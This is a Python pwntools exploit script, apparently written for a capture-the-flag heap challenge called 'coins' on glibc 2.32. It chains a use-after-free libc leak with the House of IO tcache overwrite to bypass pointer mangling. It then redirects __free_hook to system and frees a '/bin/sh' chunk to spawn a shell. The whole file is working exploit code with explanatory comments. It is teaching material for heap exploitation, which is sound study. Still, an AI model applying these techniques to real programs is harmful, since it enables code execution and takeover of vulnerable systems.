'''
Using the ptr mangling mitigations and bypassing them. 

This file has two different solutions: 
- Using heap leak then altering the fd ptr as normal (just with mangling) 
- House of IO 

Eventually, these will be split into two different challenges AND/or IO 
will be removed. But, we'll see! :) 
'''

from pwn import * 
import os
import mangle

mode = 'DEBUG' # Turn on gdb
libc_name = '../../libc_versions/2.32/libc-2.32.so' # For alternate version of libc

env = {}

# Binary setup
elf_name = '.coins-2.32'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env)
	gdb.attach(p, gdbscript='''
dir ../../libc_versions/2.32/	
''') 
else: 
	p = process(elf.path, env=env) 

'''
Selects a coin at a given index 
Parameters: 
	- index: The coin to select 
'''
def select(index): 
	p.sendlineafter(">", "1") 
	p.sendlineafter(":", str(index)) 

''' 
Makes a coin
Parameters: 
	- head: the text for the head of the coin 
	- tail: the text for the tail of the coin 
	- value: the amount the coin is worth
'''
def make(head, tail, value): 
	p.sendlineafter(">", "2") 
	p.sendlineafter(":", str(head))
	p.sendlineafter(":", str(tail)) 
	p.sendlineafter(":", str(value)) 

'''
Makes a coin
'''
def make_tmp(): 
	p.sendlineafter(">", "2") 

'''
Edits a coin -- Assumes the proper coin is already 'selected'
Parameters: 
	- head: the text for the head of the coin 
	- tail: the text for the tail of the coin 
	- value: the amount the coin is worth
'''
def edit(head, tail, value): 
	p.sendlineafter(">", "3") 
	p.sendlineafter(":", str(head)) 
	p.sendlineafter(":", str(tail)) 
	p.sendlineafter(":", str(value)) 

'''
Prints the contents of a coin  -- Assumes the proper coin is already 'selected'
Returns: 
	- Coin: Index 0 is the head, index 1 is the tail and index 2 is 
	        the value. 
'''
def see():
	p.sendlineafter(">", "4") 
	p.recvuntil("Head Design: ") 
	head = p.recvuntil("Tail Design: ").replace("\nTail Design: ", "") 
	tail = p.recvuntil("Worth: ").replace("\nWorth: ", "") 
	value = p.recvuntil("Options").replace("\nOptions","")
	return head, tail, int(value)

''' 
Removes a coin -- Assumes the proper coin is already 'selected'
Parameters: 
	- head: the text for the head of the coin 
	- tail: the text for the tail of the coin 
	- value: the amount the coin is worth
'''
def remove(): 
	p.sendlineafter(">", "5") 

'''
Exploit steps for the house of io

First, we overwrite the tcache memory ourselves!
Then, we use the overwritten chunk to get code execution.
'''
def io(): 
	overwrite_tcache() 
	io_code_exec() 

# Used to bypass the mangling by editing the tcache data structures!
# Assumes a libc leak but does not require a heap leak 
def overwrite_tcache():
	'''
	TCache section is made up of a struct that looks like the following:
	 - uint16_t counts[TCACHE_MAX_BINS]; <-- TCACHE_MAX_BINS is default 64
	 - tcache_entry *entries[TCACHE_MAX_BINS];

	So, the first item is an array of 2 byte integers to represent 
	the amount of items in a given bin. 64 * 2 = 128 bytes
	
	The second item is a list of pointers, which are 8 bytes per
	ptr. SO, there is 64 * 8 = 512 bytes


	Our goal is to bypass the ptr mangling by altering the tcache 
	structure itself! This is to do without a normal ptr 
	overwrite because the second field of the tcache is 'key',
	which points to the beginning of the tcache!
	'''

	# Try to keep the tcache in as normal shape as possible.

	'''
	The struct for a coin is held in at the first tcache bin. 
	So, we going to set the amount of entries in the tcache
	bin in order to each the ptrs. If null bytes were allowed,
	we'd want to set the first bin to 0x2 and the rest to 0x0 
	'''
	fake_tcache = "A" * 2 * 64 

	'''
	Set the first bin ptr holder for the tcache to __free_hook.

	Overwriting the free hook is SUPER nice because $rdi (a pointer to the 
	memory of the chunk) acts as a controllable parameter!
	'''
	fake_tcache += p64(libc.symbols['__free_hook'] ) 

	'''
	Use the head field (dereferences a pointer to 'key') to write
	to the tcache. 

	For the tail, enter nothing so that the heap ptrs do not get 
	altered. 
	'''
	edit(fake_tcache, "", 0x0) 


def io_code_exec():	

	# Function ptr to jump to. Could use one_gadget (if this worked?) 
	# Or, change location to _free_hook and call 'system' instead.
	# Or ROP! :) 
	func = libc.symbols['system'] 

	'''
	The 'head_desc' acts as the first parameter to a call to 'free'
	But, instead of 'free' we call 'system'! 

	So, passing in /bin/sh to system pops a shell for us :) 
	'''
	make("/bin/sh", "f0r-L1F3", func)
	
	# Trigger code execution via a call to free (overwrite __free_hook)
	remove() 

def get_libc_leak(): 

	'''
	The vulnerability is a use after free on the currently 
	selected coin, once it has been freed. 
	'''
	# Create 3 coins. Index 0,1,2. 
	make("A" * 8, "B" * 8, 8) 
	make("C" * 8, "D" * 8, 9) 
	make("E" * 8, "F" * 8, 10) 

	# Create a UAF on coin 1 in order to get nice leaks from LibC. 
	select(1) 
	remove() 

	'''
	Returns in the following order: head, tail, coin value. 
	The head points to a useless field but the tail points to 
	a chunk that is in the unsorted bin (from the free). 
	
	Because this is the only entry in the unsorted bin, 
	both the fd and bk fields are pointers to the unsorted_bin 
	itself (aka, a libc ptr). 

	So, we read this to get a LibC leak. 
	'''
	_, libc_leak, heap_managled = see()
	libc_offset = 0x1b2be0
	libc_leak = u64(libc_leak.ljust(8, "\x00"))
	print("LibC Leak: ", hex(libc_leak))

	libc_base = libc_leak - libc_offset
	print "LibC Base: ", hex(libc_base)
	libc.address = libc_base 
	return libc_base

# Get UAF on fd ptr and ability to write to the TCache itself
def edit_fd_uaf(): 
	'''
	There's a UAF on coins only after they have just been deleted
	via the lack of a ptr being cleared. 
	
	There is currently one item in the 0x20 tcache (bin 0). 
	If we free another one, we will have a ptr to the TOP of the 
	bin with the count of the bin being at 2. 

	So, we this allows for a trivial overwrite of the fd ptr and 
	puts 'key' (double free check that points to the beginning of 
	the tcache) in the second slot. 
	'''
	# Create a UAF on coin 0 to leak heap address. 
	select(0) 
	remove()


# Sets LibC as the libc.address in order to just reference the ELF for symbols. 
libc_base = get_libc_leak()
edit_fd_uaf()

io()
p.interactive()
